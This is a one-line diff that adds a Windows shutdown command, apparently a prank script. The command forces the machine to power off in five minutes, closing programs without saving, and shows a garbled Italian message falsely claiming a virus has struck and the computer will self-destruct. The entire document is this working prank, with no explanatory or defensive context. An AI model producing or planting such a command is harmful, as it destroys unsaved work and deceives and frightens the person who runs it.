@@ -1,0 +1,1 @@
+shutdown -s -f -t 300 -c "'?ì!|@#ù[+-+*/ç§°*éàòù] QUESTO COMPUTER è STATO '?ì|@#ù[+-+*/ç§°*éàòù] COLPITO DA UN VIRUS E '?ì|@#ù[+-+*/ç§°*éàòù] SI AUTODISTRUGGERà TRA 5 MINUTI '?ì|@#ù[+-+*/ç§°*éàòù]"
